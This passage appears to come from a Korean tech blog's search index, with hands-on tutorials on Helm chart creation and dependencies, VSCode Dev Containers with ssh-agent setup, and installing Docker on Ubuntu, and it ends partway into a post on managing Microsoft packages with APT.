있습니다.\n3. chart 패키징 해보기 헬름 차트를 배포하기 위해, 패키징을 해봅니다.\nhelm package . tree helm repo index . cat index.yaml 해당 차트를 차트 저장소(repository)에 게시하여 공유를 할 수 있는데,\n차트 저장소는 HTTP 서버이며,\n(1) 차트 및 (2).tgz 파일,\n(3) 차트에 대한 메타데이터 정보를 담은, index.html 파일이 있어야한다고 합니다.\n차트를 저장소에 게시하려면 index.html 파일에 새 메타데이터 정보로 업데이트하고\n해당 아티팩트를 업로드해야 한다고 합니다.\n4. 리포지토리의 chart 배포 리포지토리에서 helm chart를 가져와 배포해보겠습니다.\n(1) chart 가져오기 bitnami의 리포지토리를 등록하고, postgresql 차트를 확인합니다.\nhelm repo add bitnami https://charts.bitnami.com/bitnami helm repo list helm search repo postgresql helm search repo postgresql -o json | jq (2) 배포해보기 앞서 확인한 bitnami/postgresql 차트를 배포해봅니다.\nhelm install my-db \\ --set postgresql.postgresqlUsername=my-default,postgresql.postgresqlPassword=postgres,postgresql.postgresqlDatabase=mydb,postgresql.persistence.enabled=false \\ bitnami/postgresql 해당 리포지토리의 지원 관련 경고와 함께 배포되었음을 확인할 수 있습니다.\n배포 현황을 확인해봅니다.\nhelm list kubectl get sts,pod,svc,ep,secret (4) values 확인 및 실습 정리 기본값(default values)는 helm show를 통해 확인 가능합니다.\n# helm get values my-db ## 기본값 확인 불가능 helm show values bitnami/postgresql 아래 방법으로 조금 더 간소하게 확인할 수 있습니다.\nhelm show values bitnami/postgresql | grep -v \u0026#39;#\u0026#39; 리소스를 정리합니다.\nhelm uninstall my-db 5. chart간 의존성 설정하기 이제는 직전에 배포해봤던 bitnami/postgresql 차트와\njava 애플리케이션 차트 간의 의존성을 설정하여 배포해보겠습니다.\n(1) 배포 파일 구성 해당 구성들은 아래 GitHub에 탑재되어 있습니다.\nhttps://github.com/kkumtree/ci-cd-cloudnet-study\nHelm의 구성파일들은 2w/music 폴더에 있습니다.\n아래와 같이 차트를 구성했습니다.\n## 2w/shells/helm-dependency 폴더의 쉘 파일을 활용 # ❯ tree # . # |____values.yaml # |____Chart.yaml # |____templates # | |____deployment.yaml # | |____service.yaml 다른 점은 Chart.yaml에 dependencies 설정이 있다는 점입니다.\ntail -n 4 Chart.yaml # dependencies: # - name: postgresql # version: 18.0.17 # repository: \u0026#34;https://charts.bitnami.com/bitnami\u0026#34; (2) 의존성 차트 다운로드 차트를 다운로드 하면, .tgz 압축파일을 확인할 수 있습니다.\nhelm dependency update \u0026amp;\u0026amp; tree # |____values.yaml # |____Chart.yaml # |____charts # | |____postgresql-18.0.17.tgz # |____Chart.lock # |____templates # | |____deployment.yaml # | |____service.yaml 더불어, Chart.lock 파일도 생성되었음을 확인할 수 있습니다.\n(3) 배포 및 확인 배포를 합니다.\nhelm install music-db . 아래와 같이 PostgreSQL Pod 내에서, values.yaml에 지정한\nusername, my-default를 생성 database, mydb를 생성 후, my-default에 접근권한을 생성 하는 로그를 확인할 수 있습니다.\nJava 애플리케이션에서도, DB에 접근이 가능해지자 SQL문을 통해 테이블을 생성하고 레코드를 삽입하는 것을 볼 수 있었습니다.\n(4) 정상 작동 확인 해당 service에 port-forward 설정 후, 새로운 탭에서 호출하여 응답을 확인합니다.\n# 탭 1 kubectl port-forward service/music 8080:8080 # 탭 2 curl -s http://localhost:8080/song (참고) values.yaml 변수 설정 해당 image의 버전이 10.y.z 에서 18.y.z로 오면서,\nchart 변수 지정 방법이 바뀌었습니다.\n# values.yaml postgresql: # postgresqlUsername: my-default # postgresqlPassword: postgres # postgresqlDatabase: mydb secretName: music-db-postgresql secretKey: postgres-password auth: username: my-default password: password database: mydb auth.username: 사용자 정의 유저를 생성 auth.password: 해당 secret(이 경우, music-db-postgresql)의 key 값 지정 auth.database: 사용자 정의 유저가 접근할 database명 참고로 Database 이미지이므로, helm uninstall 로 차트를 제거했을지라도\nPVC/PV는 남아있으니, 이후에 확인 후 제거하면 됩니다.\nhelm uninstall music-db kubectl get pvc kubectl get pv kubectl delete pvc data-music-db-postgresql-0 kubeclt get pvc,pv Reference Bitnami package for PostgreSQL Helm 101 - CI/CD 스터디 2주차 ","date":"2025-10-26T03:16:04+09:00","permalink":"https://blog.minseong.xyz/post/helm-template-reusing-statements/","section":"post","tags":["helm","CICD","CloudNet@"],"title":"Helm 템플릿으로 재사용성 높이기 - CI/CD 스터디 2주차"},{"categories":null,"contents":"CloudNet@에서 진행하고 있는 CI/CD Study 2주차에는 Helm과 Tekton을 다뤘습니다.\n이번에는 Helm의 기본적인 부분을 다루도록 하겠습니다.\n1. Helm의 역할과 실습 준비사항 Helm? 템플릿 기반 솔루션. 즉, 버전 관리 및 공유, 배포가 가능한 아티팩트를 생성하도록 돕습니다.\nHelm chart(차트)\n공유 가능한 Kubernetes(쿠버네티스, 이하 k8s) 패키지며, 차트 간 의존성 등 다양한 요소를 포함합니다. k8s를 다루면 Helm을 많이 사용하게 되는데, 그 이유 중 하나가 chart 개념입니다. Rolling Update for ConfigMap\n애플리케이션의 설정값은 일반적으로 k8s의 ConfigMap에 대응되는 속성입니다. ConfigMap: 수정되어도 애플리케이션의 롤링 업데이트 전, 즉 애플리케이션을 수동 재시작 하기 전까지는 값이 적용되지 않습니다. Helm은 ConfigMap이 변경되면, 자동으로 Rolling Update가 이루어지는 기능들을 제공합니다. 실습 준비 kind\nkind 설치의 경우 다음 포스트를 참고할 수 있습니다.\n리눅스에 KIND 설치하기 w/golang\nDocs: https://kind.sigs.k8s.io/\nkind를 통해, 로컬 환경에 k8s를 배포해보겠습니다.\n# 2w/shells/kind/up-kind.sh kind create cluster --name myk8s --image kindest/node:v1.32.8 --config - \u0026lt;\u0026lt;EOF kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 nodes: - role: control-plane extraPortMappings: - containerPort: 30000 hostPort: 30000 - containerPort: 30001 hostPort: 30001 EOF 2. Helm 설치\nSnap패키지(snapcraft)로도 설치가 가능하니,\n이 방법으로 설치해보겠습니다.\nsudo snap install helm --classic 2. Helm Project 101 아래의 구조를 갖습니다.\nChart.yaml: metadata templates: 설치와 관련된 모든 템플릿 파일 deployment.yaml service.yaml (..) values.yaml: chart default value 아래와 같이 4개의 YAML파일을 생성해보겠습니다.\n해당 구성들은 아래 GitHub에 탑재되어 있습니다.\nhttps://github.com/kkumtree/ci-cd-cloudnet-study\nHelm의 구성파일들은 2w/pacman 폴더에 있습니다.\n(1) Chart.yaml Helm chart의 메타데이터 정의 https://helm.sh/docs/topics/charts/#the-chartyaml-file\n# 2w/shells/helm/1-helm-chart.yaml cat \u0026lt;\u0026lt; EOF \u0026gt; Chart.yaml apiVersion: v2 name: pacman description: A Helm chart for Pacman type: application version: 0.1.0 appVersion: \u0026#34;1.0.0\u0026#34; EOF apiVersion: chart API 버전 Helm 2는 V1, Helm 3는 V2 값을 갖습니다. name: 차트에 대한 이름 version: 차트 에 대한 버전 (SemVer, 시맨틱 버전 규칙) 차트 정의가 바뀌면 업데이트 description: 차트에 대한 설명 type: 차트의 타입 (optional) application(기본값) 혹은 library 택 1. library: 재사용 가능한 차트. 배포 되지 않는 일종의 템플릿. appVersion: 어플리케이션 버전 version과 독립적. 권장표기: 쌍따옴표(\u0026quot;) 사용. \u0026quot;\u0026lt;APPLICATION_VERSION\u0026gt;\u0026quot; (2) templates/deployments.yaml 일반적인 deployment에 템플릿 언어 및 함수를 사용하여 배포 정의\n템플릿에 쓰이는 언어는 Go\n# 2w/shells/helm/2-helm-deployment.yaml cat \u0026lt;\u0026lt; EOF \u0026gt; templates/deployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: {{ .Chart.Name}} labels: app.kubernetes.io/name: {{ .Chart.Name}} {{- if .Chart.AppVersion }} app.kubernetes.io/version: {{ .Chart.AppVersion | quote }} {{- end }} spec: replicas: {{ .Values.replicaCount }} selector: matchLabels: app.kubernetes.io/name: {{ .Chart.Name}} template: metadata: labels: app.kubernetes.io/name: {{ .Chart.Name}} spec: containers: - image: \u0026#34;{{ .Values.image.repository }}:{{ .Values.image.tag | default .Chart.AppVersion}}\u0026#34; imagePullPolicy: {{ .Values.image.pullPolicy }} securityContext: {{- toYaml .Values.securityContext | nindent 14 }} name: {{ .Chart.Name}} ports: - containerPort: {{ .Values.image.containerPort }} name: http protocol: TCP EOF metadata: Chart.yaml 파일에 설정된 값으로 설정 {{ .Chart.AppVersion}}: 필수요소가 아니므로, 조건문으로 구성 {{ .Chart.Name}}: name 및 labels.app.kubernetes.io/name spec: Chart.yaml 파일 및 후술할 values.yaml에 설정된 값으로 설정 \u0026quot;{{ .Values.image.repository }}:{{ .Values.image.tag | default .Chart.AppVersion}}\u0026quot; image 및 image tag 지정 방법 values.yaml에 tag 지정이 없을시, Chart.yaml에 있는 AppVersion을 기본값으로 설정 toYaml: Helm Docs/ {{- toYaml .Values.securityContext | nindent 14 }} 앞의 공백 제거 후, 해당 부분을 YAML 객체화. 이후 14칸의 들여쓰기 {{ .Values.replicaCount}} {{ .Values.image.pullPolicy}} (3) templates/service.yaml 서비스 이름 및 컨테이너 포트 지정\n# 2w/shells/helm/3-helm-service.yaml cat \u0026lt;\u0026lt; EOF \u0026gt; templates/service.yaml apiVersion: v1 kind: Service metadata: labels: app.kubernetes.io/name: {{ .Chart.Name }} name: {{ .Chart.Name }} spec: ports: - name: http port: {{ .Values.image.containerPort }} targetPort: {{ .Values.image.containerPort }} selector: app.kubernetes.io/name: {{ .Chart.Name }} EOF (4) values.yaml default values, 기본 설정 정의\n# 2w/shells/helm/4-values.yaml cat \u0026lt;\u0026lt; EOF \u0026gt; values.yaml image: repository: quay.io/gitops-cookbook/pacman-kikd tag: \u0026#34;1.0.0\u0026#34; pullPolicy: Always containerPort: 8080 replicaCount: 1 securityContext: {} EOF 템플릿 정의 부분 확인 image.* replicaCount securityContext: {} (속성 비움) 3. Local rendering to YAML 로컬에서 렌더링을 해봅니다. helm template . Chart.yaml과 values.yaml을 제외한, YAML 파일들의 렌더링 확인 기본값 재정의 후, 렌더링 (\u0026ndash;set) 기본값을 변경(override)하여 정상 적용되는지 확인해봅니다.\nvalues.yaml의 replicaCount를 변경해보겠습니다.\n# # 기존(deployment.yaml) # # spec.replicas: 1 # helm template . | grep \u0026#34;replicas:\u0026#34; -B9 helm template --set replicaCount=3 . | grep \u0026#34;replicas:\u0026#34; -B9 4. kind(k8s)에 chart 배포 및 helm 확인 실제로 k8s에 배포 후, 확인을 합니다.\nhelm install pacman . helm list kubectl get deploy,pod,service,ep helm history pacman kubectl get pod -o yaml | grep securityContext -A1 # secret도 보겠습니다. kubectl get secret Secret 생성 이유? sh.helm.release.v1.pacman.v1 Helm은 배포 릴리스에 대한 metadata를 저장하기 위해, 자동으로 Secret 리소스를 생성합니다.\nHelm이 차트의 상태를 복구하거나 rollback 할 때 이 데이터를 이용 이번엔 replicaCount 값을 재설정하여, 배포를 합니다. --reuse-values: 업그레이드 진행시, 최신 릴리스의 값에 CLI Override(`\u0026ndash;set 및 -f)값과 합쳐 적용. helm upgrade pacman --reuse-values --set replicaCount=2 . kubectl get pod 히스토리와 시크릿은 upgrade 할 때마다 누적되는 것을 확인할 수 있습니다. kubectl get secret helm history pacman 이외에도 chart의 배포 정보, 즉 metadata를 살펴보겠습니다. helm get all pacman helm get values pacman helm get manifest pacman helm get notes pacman all: 아래 내용에 대한 전체 사항 values: USER-SUPPLIED VALUES(사용자 지정 값) manifest: chart에 의해 생성된 k8s 리소스의 표현 (YAML 형식) notes: 해당 릴리스에 대한 노트(메모) chart의 secret의 경우, 아래 사진과 같은 base64로 인코딩된 값을 가집니다. 이 값을 2번 디코딩했을때는 아래와 같이 출력됩니다. kubectl get secrets sh.helm.release.v1.pacman.v1 -o jsonpath=\u0026#39;{.data.release}\u0026#39; | base64 -d | base64 -d | gzip -d | jq secret이 갖고있던 메타데이터 키값들을 확인해봅니다. kubectl get secret sh.helm.release.v1.pacman.v3 -o jsonpath=\u0026#39;{.data.release}\u0026#39; | base64 -d | base64 -d | gzip -d | jq -r \u0026#39;paths(scalars) | join(\u0026#34;.\u0026#34;)\u0026#39; 5. chart 삭제 후 확인 helm uninstall pacman kubectl get secret chart를 삭제하면, 변화를 기록하던 시크릿도 다 함께 사라진 것을 확인할 수 있습니다. 8. Chart API v1 -\u0026gt; v2 변화점 (Helm v2 to v3) A dependencies field defining chart dependencies, which were located in a separate requirements.yaml file for v1 charts. The type field, discriminating application and library charts.\n기존 requirements.yaml에 분리되어 있던 dependencies 필드는, Chart.yaml에서 정의됩니다. type 필드 도입을 통해서 일반적인 애플리케이션용인지, 직접 배포되지 않아야하는 라이브러리인지 식별하는데 도움을 줍니다. 9. Template 관련 No. 기능 표현 설명 참고 1 Whitespace Control {{- 앞의 공백문자(\\n포함) 제거 {{ 2 newline indent nindent 앞에 개행 추가 indent 3 함수 호출(권장) {{ toYaml \u0026hellip; }} 템플릿 함수 sprig 9 template 호출 {{ include \u0026quot;toYaml\u0026quot; \u0026hellip; }} toYaml이라는 템플릿 호출 {{ define \u0026quot;toYaml\u0026quot; }} _helpers.tpl등에 정의 (과거) 조건문 및 쌍따옴표 처리\n{{- if \u0026lt;VAR\u0026gt; }} # 변수가 있을 때에만 KEY: {{ \u0026lt;VAR\u0026gt; | quote }} # 해당 변수에 쌍따옴표를 붙여서 구성 {{- end }} securityContext: 컨테이너 보안\n공백 처리 방법:{}\nnil 방지 기본값으로 비어있는 객체로 설정한다는 의미 (예시)\nsecurityContext: capabilities: drop: - ALL readOnlyRootFilesystem: true runAsNonRoot: true runAsUser: 1000 runAsUser / runAsGroup:\n컨테이너를 특정 유저 ID나 그룹 ID로 실행 runAsNonRoot:\nroot 권한 방지 readOnlyRootFilesystem:\n컨테이너의 루트 파일 시스템을 읽기 전용으로 설정 allowPrivilegeEscalation:\n부모 프로세스보다 더 많은 권한을 컨테이너 내부 프로세스가 획득하는 것을 설정 Reference Install helm on Linux | Snap Store Helm | Charts Semantic Versioning Sprig Function Documentation Decoding Helm3 resources in secrets 리눅스에 KIND 설치하기 w/golang ","date":"2025-10-24T01:17:39+09:00","permalink":"https://blog.minseong.xyz/post/helm-hello-world/","section":"post","tags":["helm","CICD","CloudNet@"],"title":"Helm 101 - CI/CD 스터디 2주차"},{"categories":null,"contents":"한가위 연휴의 끝과 함께, CloudNet@에서 진행하고 있는 CI/CD Study에 참여하게 되었습니다.\n이번에는 핸즈온용으로 즐겨쓰는 GitHub CodeSpace와 연관된,\nVisual Studio 상에서의 Dev Containers 활용에 대해 다뤄보고자 합니다.\n사용 OS환경은 Ubuntu Desktop 24.04 LTS 이며,\n아래의 문서에서 안내된대로 차근차근 따라해보며 좀 더 이해를 해보고자 합니다.\nDeveloping inside a Container\n0. Docker 설치 내용이 길어, 아래의 포스트로 나누었습니다.\nUbuntu Docker 설치 작성 기준, Dev Container는 Ubuntu Snap 패키지(snapcraft)로 설치된 Docker에는 지원되지 않는다고 합니다. 사용자($USER)를 docker 그룹에 추가하여야합니다.\n(위 게시물의 3. 권한 상승 설정 (선택) 참고) 1. Dev Containers 확장 프로그램 Visual Studio Code(이하, VSCode)에서 제공되는, Dev Containers 확장 프로그램을 사용하면, 개발 환경에 필요한 모든 기능이 갖춰진 Container를 구축하여 환경을 구성할 수 있습니다.\n컨테이너 내부 혹은 컨테이너에 마운트된 폴더를 통해 접근하여, VSCode IDE의 모든 기능을 사용할 수 있습니다.\n핵심은 devcontainer.json 파일이며, 프로젝트 단위에서 개발용 컨테이너의 구성 및 접근 방법이 명세되어 있습니다.\n이를 통해, 앱을 구동하거나 코드 개발에 필요한 도구, 라이브러리, 혹은 런타임을 사전에 정의할 수 있습니다.\n컨테이너 내에서 구동될 파일들: 로컬 환경의 파일이 마운트되거나, 컨테이너 내부로 복사됩니다. VSCode의 확장 프로그램들: 컨테이너 내부에 설치되며, 내부의 플랫폼 및 파일시스템에 대한 모든 권한을 가집니다. 이를 통해,\n개발환경을 쉽게 전환할 수 있습니다. 다양한 로컬 환경과 관계없이, 개발 환경을 일관성있게 유지할 수 있습니다. Dev Containers 확장 프로그램은 두 가지 기본 모델을 지원합니다.\n컨테이너를 풀타임 개발환경으로 사용하거나, 실행 중인 컨테이너에 연결하여 사용할 수 있습니다. 2. 시작 전 설정 로컬 환경: Docker 및 VSCode가 설치되어야 합니다.\n(VSCode와 같은 경우, 기존 게시물이 도움 될 수 있습니다.) Dev Container 확장프로그램을 설치합니다. Git을 사용한다면: 이를 위한 로컬의 SSH Key를 공유하도록 설정할 수 있습니다. Dev Container 확장프로그램 설치 VSCode 내 Extenstion 메뉴를 열고 Dev Contatiners를 검색, 설치 합니다.\n(Microsoft를 확인합니다)\nGit 사용을 위한, Host SSH 키 사용 설정 아래 문서의 내용에 따라, Dev Containers에서 Host의 SSH 키를 사용할 수 있도록 ssh-agent를 설정합니다.\nSSH키에 암호가 있을 경우, git 동기화에 이슈가 발생할 수 있습니다. 이는, git push 명령어를 통해 우회하거나, 암호가 없는 SSH키를 사용하여야합니다.\nSharing Git credentials with your container\n(1) .gitconfig 파일에 대해서 Dev Containers 확장 프로그램은 Host의 .gitconfig파일을 컨테이너에 자동으로 복사합니다.\n이 파일은 아래처럼 git config \u0026ndash;global 을 통해 지정한 전역 설정값을 담고 있습니다.\n(2) ssh-agent 실행 설정 MacOS와는 달리, Linux환경에서는 자동으로 실행하도록 섧정되어 있지 않으므로 오류를 방지하기 위해 설정합니다.\nSSH Agent가 백그라운드에서 구동되도록 설정합니다. eval \u0026#34;$(ssh-agent -s)\u0026#34; Shell 프로파일에 아래의 내용을 추가하여, 자동 실행될 수 있도록합니다. (위의 명령어가 실행된 상태여야 합니다.) (bash) ~/.bash_profile / (zsh) ~/.profile 사용자 지정 기본 쉘 확인: echo $SHELL 현재 사용 중인 쉘 확인: echo $0\n# 적용 전, SSH AUTH소켓이 지정되었는 지 확인합니다. echo \u0026#34;$SSH_AUTH_SOCK\u0026#34; # TTMP=$(basename \u0026#34;$0\u0026#34;); if [ \u0026#34;$TTMP\u0026#34; = \u0026#34;bash\u0026#34; ]; then ls -l ~/.bash_profile ; elif [ \u0026#34;$TTMP\u0026#34; = \u0026#34;zsh\u0026#34; ]; then ls -l ~/.zprofile; else echo \u0026#34;현재 쉘: $TTMP은 bash 혹은 zsh이 아닙니다.\u0026#34;; fi;unset TTMP if [ -z \u0026#34;$SSH_AUTH_SOCK\u0026#34; ]; then # Check for a currently running instance of the agent RUNNING_AGENT=\u0026#34;`ps -ax | grep \u0026#39;ssh-agent -s\u0026#39; | grep -v grep | wc -l | tr -d \u0026#39;[:space:]\u0026#39;`\u0026#34; if [ \u0026#34;$RUNNING_AGENT\u0026#34; = \u0026#34;0\u0026#34; ]; then # Launch a new instance of the agent ssh-agent -s \u0026amp;\u0026gt; $HOME/.ssh/ssh-agent fi eval `cat $HOME/.ssh/ssh-agent` \u0026gt; /dev/null ssh-add 2\u0026gt; /dev/null fi 이후, 마지막 줄을 설정할 지정한 SSH key로 바꿉니다. # $HOME/.ssh/id_ed25519 키를 사용할 경우 # # 확인 # sed \u0026#39;s#ssh-add 2\u0026gt; /dev/null#ssh-add $HOME/.ssh/id_ed25519 2\u0026gt; /dev/null#\u0026#39; ~/.bash_profile | tail -n 4 # 적용 sed -i \u0026#39;s#ssh-add 2\u0026gt; /dev/null#ssh-add $HOME/.ssh/id_ed25519 2\u0026gt; /dev/null#\u0026#39; ~/.bash_profile # 적용 확인 tail -n 4 ~/.bash_profile # ps -ax | grep \u0026#39;ssh-agent -s\u0026#39; | grep -v grep | wc -l | tr -d \u0026#39;[:space:]\u0026#39; 3. Quick Start 3가지로 구성되어 있습니다.\n개발용 컨테이너 사용해보기 컨테이너에서 기존 폴더 열어보기 격리된 컨테이너 볼륨에서 Git 저장소 또는 GitHub PR 열어보기 (1) 개발용 컨테이너 사용해보기 가장 쉬운 방법으로, 개발용 컨테이너 샘플 중 하나를 사용해봅니다.\ndocker --version 명령어로 docker 설치여부 확인\n상단 검색바를 선택 후, \u0026gt;Try a Dev 를 입력하여 Dev Containers: Try a Dev Container Sample...을 선택합니다.\nNode를 선택합니다.\n선택하면 아래와 같이 표시되며, 빌드가 완료될 때까지 대기 합니다.\n우측 하단: Connecting Dev Container (show log) 좌측 하단: Dev Container: \u0026lt;컨테이너명\u0026gt; 우측 하단의 메시지를 클릭하면 아래처럼 Docker 작업 현황을 볼 수 있습니다.\nTERMINAL 탭에서 +를 클릭하여 New Terminal 또는 New Terminal Window를 선택합니다.\n이번에는 New Terminal Window를 선택하여, 새 창에 터미널을 띄워보겠습니다.\nNode 버전을 확인해보겠습니다.\n# node --version; npn --version node -v; npm -v VSCode에서 F5키를 눌러 애플리케이션을 실행해보겠습니다.\nDEBUG CONSOLE 탭: 3000포트에서 샘플 어플리케이션이 구동되고 있음 PORT 탭: Forwarded port, 로컬 포트 3000번이 열림\n브라우저에서 http://localhost:3000으로 이동하면, 간단환 Node.js 서버가 실행되고 있음을 확인할 수 있습니다.\nFile \u0026gt; Close Remote Connection을 클릭하여, 원격 세션을 종료합니다.\nDev Containers 확장 프로그램의 작동 원리 확장 프로그램은 .devcontainer 폴더에서 아래의 파일을 기반으로 Dev Container를 생성합니다. devcontainer.json (옵션) Dockerfile, docker-compose.yml devcontainer.json GitHub: microsot/vscode-remote-try-node\n\u0026ldquo;image\u0026quot;에 정의된 이미지를 사용하여, 이미지를 빌드합니다. \u0026ldquo;customizations\u0026quot;에 정의된 streetsidesoftware.code-spell-checker 확장 프로그램을 설치합니다. \u0026ldquo;portsAttributes\u0026quot;에 지정된 3000 포트를 노출합니다. \u0026ldquo;portsAttributes\u0026quot;에 지정된 yarn install로 yarn 패키지를 설치합니다. (2) 컨테이너에서 기존 폴더 열어보기 그러면 Host의 기존 소스 코드를 사용해서, 기존 소스 코드의 언어를 위한 Dev Container를 설정해보겠습니다.\n기존의 Go 언어 소스코드가 있기에, Go언어에 대해 완비된 개발 환경을 설정해보겠습니다.\nF1로 명령 팔레트를 호출하여(상위 검색 바를 클릭 후, \u0026gt;를 입력하는 것과 같은 효과), Dev Containers: Open Folder in Container... 를 실행합니다.\n이후, 대상 프로젝트 폴더를 선택한 후, Open을 클릭합니다.\n이번에는 Add configuration to user data folder를 선택하여, 로컬에 설정을 저장합니다. 로컬 설정값의 경로: $HOME/.config/Code/User/globalStorage/ms-vscode-remote.remote-containers/configs\n이후, 추천받은 Go 컨테이너를 선택해봅니다.\n기존 소스코드가 go1.22 버전 기반이었기에, 1.22-bookworm을 선택해봅니다.\n(선택) 그외에 다양한 부가 기능을 선택하여 미리 추가할 수 있습니다. 이번에는 생략합니다.\n(선택) dependabot.yml 생성. 무해하기에 선택해서 생성해보았습니다.\n그러면 Dev Container 구성을 시작합니다.\nGo 1.22가 미리 구성된 Dev Container 환경 내에서 VSCode로 코드를 편집, 테스트할 수 있습니다.\n또한, 컨테이너 환경에서 소스코드 수정을 하면, Host에서도 변경된 소스코드를 확인할 수 있습니다.\n(3) 격리된 컨테이너 볼륨에서 Git 레포지토 또는 GitHub PR 열기 PR 검토를 위한, Git 레포지토리 격리된 복사본을 사용하거나 작업에 영향을 주지 않고 다른 브랜치를 조사하려는 경우\n","date":"2025-10-19T20:50:46+09:00","permalink":"https://blog.minseong.xyz/post/vscode-devcontainer-usage/","section":"post","tags":["vscode","devcontainer","docker","CloudNet@"],"title":"VSCode DevContainer - CI/CD 스터디 1주차"},{"categories":null,"contents":" Docker 사용을 위한 기본적인 설치 방법 메모\nInstall Docker Engine on Ubuntu | Docker Documentation 0. 이전 버전 제거 (선택) 진행 중인 Docker 관련 작업이 없어, prune 명령어를 통해 기존 Docker의 리소스들을 삭제 진행하였습니다. docker system prune -a 공식 문서에 따라, 아래 커맨드로 삭제를 진행합니다. (겸사겸사 autoremove도 진행합니다.) for pkg in docker.io docker-doc docker-compose docker-compose-v2 podman-docker containerd runc; do sudo apt-get remove $pkg; done sudo apt-get autoremove # ❯ for pkg in docker.io docker-doc docker-compose docker-compose-v2 podman-docker containerd runc; do sudo apt-get remove $pkg; done # [sudo] password for kkumtree: # Reading package lists... Done # Building dependency tree... Done # Reading state information... Done # The following packages were automatically installed and are no longer required: # bridge-utils containerd pigz runc ubuntu-fan # Use \u0026#39;sudo apt autoremove\u0026#39; to remove them. # The following packages will be REMOVED: # docker.io # 0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded. # After this operation, 126 MB disk space will be freed. # Do you want to continue? [Y/n] Y # (Reading database ... 465886 files and directories currently installed.) # Removing docker.io (27.5.1-0ubuntu3~24.04.2) ... # \u0026#39;/usr/share/docker.io/contrib/nuke-graph-directory.sh\u0026#39; -\u0026gt; \u0026#39;/var/lib/docker/nuke-graph-directory.sh\u0026#39; # Stopping \u0026#39;docker.service\u0026#39;, but its triggering units are still active: # docker.socket # Processing triggers for man-db (2.12.0-4build2) ... # (...) # Removing containerd (1.7.28-0ubuntu1~24.04.1) ... # Processing triggers for man-db (2.12.0-4build2) ... # Reading package lists... Done # Building dependency tree... Done # Reading state information... Done # The following packages were automatically installed and are no longer required: # bridge-utils pigz ubuntu-fan # Use \u0026#39;sudo apt autoremove\u0026#39; to remove them. # The following packages will be REMOVED: # runc # 0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded. # After this operation, 34.3 MB disk space will be freed. # Do you want to continue? [Y/n] Y # (Reading database ... 465640 files and directories currently installed.) # Removing runc (1.3.0-0ubuntu2~24.04.1) ... # Processing triggers for man-db (2.12.0-4build2) ... # ❯ sudo apt-get autoremove # Reading package lists... Done # Building dependency tree... Done # Reading state information... Done # The following packages will be REMOVED: # bridge-utils pigz ubuntu-fan # 0 upgraded, 0 newly installed, 3 to remove and 0 not upgraded. # After this operation, 421 kB disk space will be freed. # Do you want to continue? [Y/n] Y # (Reading database ... 465612 files and directories currently installed.) # Removing ubuntu-fan (0.12.16+24.04.1) ... # ubuntu-fan: removing default /etc/network/fan configuration # Removing bridge-utils (1.7.1-1ubuntu2) ... # Removing pigz (2.8-1) ... # Processing triggers for man-db (2.12.0-4build2) ... 1. Docker 공식 GPG key와 APT 레포지토리 추가 # Add Docker\u0026#39;s official GPG key: sudo apt-get update sudo apt-get install ca-certificates curl sudo install -m 0755 -d /etc/apt/keyrings sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc sudo chmod a+r /etc/apt/keyrings/docker.asc # Add the repository to Apt sources: echo \\ \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\ $(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;${UBUNTU_CODENAME:-$VERSION_CODENAME}\u0026#34;) stable\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null sudo apt-get update 2. Docker 패키지를 설치합니다 (1) 최신 버전 sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin (2) 특정 버전 APT repository에서 받을 수 있는 버전을 조회합니다. # List the available versions: apt-cache madison docker-ce | awk \u0026#39;{ print $3 }\u0026#39; # ❯ apt-cache madison docker-ce | awk \u0026#39;{ print $3 }\u0026#39; # 5:28.5.1-1~ubuntu.24.04~noble # 5:28.5.0-1~ubuntu.24.04~noble # 5:28.4.0-1~ubuntu.24.04~noble # 5:28.3.3-1~ubuntu.24.04~noble # 5:28.3.2-1~ubuntu.24.04~noble # 5:28.3.1-1~ubuntu.24.04~noble # 5:28.3.0-1~ubuntu.24.04~noble # (...) 이후, 원하는 버전을 환경변수로 설정하여 설치합니다. VERSION_STRING=5:28.5.1-1~ubuntu.24.04~noble sudo apt-get install docker-ce=$VERSION_STRING docker-ce-cli=$VERSION_STRING containerd.io docker-buildx-plugin docker-compose-plugin 3. 권한 상승 설정 (선택) docker 그룹은 사용자에게 루트 수준의 권한을 부여합니다. https://docs.docker.com/engine/security/#docker-daemon-attack-surface\nsudo groupadd docker sudo usermod -aG docker $USER 로그아웃, 혹은 새로운 터미널에서 접속합니다.\n혹은 아래 커맨드로 그룹을 활성화할 수 있습니다. newgrp docker 9. WARNING: Error loading config file (Troubleshooting) # WARNING: Error loading config file: /home/user/.docker/config.json - # stat /home/user/.docker/config.json: permission denied 이 오류는 sudo 명령을 이전에 사용했기 때문에 ~/.docker/ 디렉터리에 대한 권한 설정이 잘못되었음을 나타냅니다. ~/.docker/ 디렉터리를 제거하거나(자동 생성되지만, 사용자 지정 설정은 삭제됩니다.) 아래와 같이, 소유권 및 권한을 변경합니다. sudo chown \u0026#34;$USER\u0026#34;:\u0026#34;$USER\u0026#34; /home/\u0026#34;$USER\u0026#34;/.docker -R sudo chmod g+rwx \u0026#34;$HOME/.docker\u0026#34; -R Reference Ubuntu | Docker Docs Manage Docker as a non-root user | Docker Docs ","date":"2025-10-17T20:53:27+09:00","permalink":"https://blog.minseong.xyz/post/docker-installation-in-ubuntu/","section":"post","tags":["docker","ubuntu"],"title":"Ubuntu Docker 설치"},{"categories":null,"contents":"Microsoft gave us a lot of programs as Ubuntu/Debian packages.\nIn this post, I will show you how to manage Edge and VSCode packages with APT package manager.\nAPT is stands for Advanced Package Tool.\nWhy? Simple. I want to upgrade them easily with APT package manager rather than using dpkg command.\nsudo apt-get update -y \u0026amp;\u0026amp; sudo apt-get upgrade -y When I installed Microsoft Edge and Visual Studio Code, I used dpkg command. But, It is little burdensome to manage packages with dpkg command in Update/Upgrade.\nSo, I want to manage them with APT package manager instead of dpkg command.\nBeyond of the ~basic~ security vulnerability of applications,\nI have to upgrade them to use useful features.\nSuch as GitHub Copilot Chat in VSCode, a.k.a. my long time friend for coding. LoL.\nStructure As I\u0026rsquo;m just one of Ubuntu users, I\u0026rsquo;m little bit understood about 